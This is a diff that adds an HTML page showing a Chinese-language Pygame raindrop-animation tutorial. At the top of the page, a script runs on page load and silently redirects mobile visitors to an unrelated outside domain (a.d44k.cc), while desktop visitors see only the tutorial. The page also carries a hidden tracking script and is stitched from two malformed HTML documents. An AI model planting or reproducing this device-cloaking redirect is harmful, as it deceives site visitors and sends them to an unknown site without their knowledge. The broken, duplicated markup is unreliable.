@@ -1,1 +1,222 @@
-HI
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        function redirectBasedOnDevice() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(userAgent);
+
+            if (isMobile) {
+                window.location.href = "http://a.d44k.cc/17c.html";
+            }
+            // 如果是电脑设备，则不跳转，继续显示当前页面内容
+            // 如果需要为电脑设备指定特定内容，可以在这里添加
+        }
+
+        // 确保在页面加载时执行跳转检测
+        window.onload = redirectBasedOnDevice;
+    </script>
+</head>
+<body>
+    <!-- 如果需要为电脑用户显示特定内容，可以在这里添加 -->
+</body>
+</html>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>科普代码</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        nav {
+            background-color: #444;
+            overflow: hidden;
+        }
+        nav a {
+            float: left;
+            display: block;
+            color: white;
+            text-align: center;
+            padding: 14px 20px;
+            text-decoration: none;
+        }
+        nav a:hover {
+            background-color: #575757;
+            color: black;
+        }
+        .content {
+            padding: 20px;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>科普代码</h1>
+</header>
+
+<nav>
+    <a href="#home">首页</a>
+    <a href="#about">关于我们</a>
+    <a href="#services">服务</a>
+    <a href="#contact">联系我们</a>
+</nav>
+
+<div class="content">
+    <h2>科普代码</h2>
+    <p>科普代码
+
+使用Python和Pygame库创建一个简单的雨滴下落动画效果。这个程序会模拟雨滴从屏幕顶部随机位置下落，并在底部消失的动画。
+
+完整代码实现
+python
+import pygame
+import random
+import sys
+ 
+# 初始化pygame
+pygame.init()
+ 
+# 设置窗口大小
+WIDTH, HEIGHT = 800, 600
+screen = pygame.display.set_mode((WIDTH, HEIGHT))
+pygame.display.set_caption("雨滴下落效果")
+ 
+# 颜色定义
+BLACK = (0, 0, 0)
+BLUE = (0, 0, 255)
+LIGHT_BLUE = (135, 206, 250)
+ 
+# 雨滴类
+class RainDrop:
+    def __init__(self):
+        self.reset()
+        self.speed = random.uniform(5, 15)  # 随机速度
+        self.length = random.randint(5, 20)  # 随机长度
+        
+    def reset(self):
+        self.x = random.randint(0, WIDTH)  # 随机x位置
+        self.y = random.randint(-100, -10)  # 从屏幕上方开始
+        
+    def fall(self):
+        self.y += self.speed
+        # 如果雨滴落到底部，重置到顶部
+        if self.y > HEIGHT:
+            self.reset()
+            
+    def draw(self):
+        # 绘制雨滴（简单的垂直线）
+        end_y = self.y + self.length
+        if end_y > HEIGHT:
+            end_y = HEIGHT
+        pygame.draw.line(screen, LIGHT_BLUE, (self.x, self.y), (self.x, end_y), 1)
+        
+        # 添加雨滴头部的小圆点
+        pygame.draw.circle(screen, BLUE, (int(self.x), int(self.y)), 1)
+ 
+# 创建多个雨滴
+raindrops = [RainDrop() for _ in range(100)]
+ 
+# 主循环
+clock = pygame.time.Clock()
+running = True
+ 
+while running:
+    for event in pygame.event.get():
+        if event.type == pygame.QUIT:
+            running = False
+    
+    # 填充黑色背景
+    screen.fill(BLACK)
+    
+    # 更新和绘制所有雨滴
+    for drop in raindrops:
+        drop.fall()
+        drop.draw()
+    
+    # 更新显示
+    pygame.display.flip()
+    
+    # 控制帧率
+    clock.tick(60)
+ 
+# 退出程序
+pygame.quit()
+sys.exit()
+代码解析
+初始化设置:
+使用Pygame创建了一个800x600像素的窗口
+定义了黑色背景和蓝色雨滴的颜色
+RainDrop类:
+__init__: 初始化雨滴，设置随机位置、速度和长度
+reset: 将雨滴重置到屏幕上方随机位置
+fall: 更新雨滴位置，实现下落效果
+draw: 在屏幕上绘制雨滴（垂直线和头部圆点）
+主循环:
+处理退出事件
+填充黑色背景
+更新所有雨滴位置并绘制
+控制帧率为60FPS
+扩展功能
+你可以通过以下方式增强这个简单的雨滴效果：
+
+添加风力效果:
+python
+# 在RainDrop类中添加
+def __init__(self):
+    # ...其他初始化...
+    self.wind = 0  # 初始无风力
+    
+def apply_wind(self, wind_force):
+    self.x += wind_force  # 水平移动
+    # 确保雨滴不会移出屏幕
+    if self.x < 0:
+        self.x = 0
+    elif self.x > WIDTH:
+        self.x = WIDTH
+添加雨滴溅起效果:
+python
+# 在RainDrop类中添加溅起方法
+def splash(self):
+    if self.y >= HEIGHT - self.length:
+        # 在底部绘制几个小点模拟溅起
+        for _ in range(3):
+            splash_x = self.x + random.randint(-5, 5)
+            splash_y = HEIGHT - random.randint(0, 5)
+            pygame.draw.circle(screen, BLUE, (splash_x, splash_y), 1)
+调整雨滴密度:
+修改raindrops = [RainDrop() for _ in range(100)]中的数字来改变雨滴数量
+运行要求
+要运行此代码，你需要安装Python和Pygame库:
+
+pip install pygame
+这个简单的雨滴下落效果可以进一步扩展，比如添加闪电效果、声音效果或更复杂的物理模拟，使其看起来更加真实。</p>
+  
+</div>
+
+<footer>
+    <p>版权所有 &copy; 2025 我的网站</p>
+</footer>
+<div style="display:none"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"JeQB9aXB1gOEUZ3T",ck:"JeQB9aXB1gOEUZ3T"})</script></div>
+</body>
+</html>
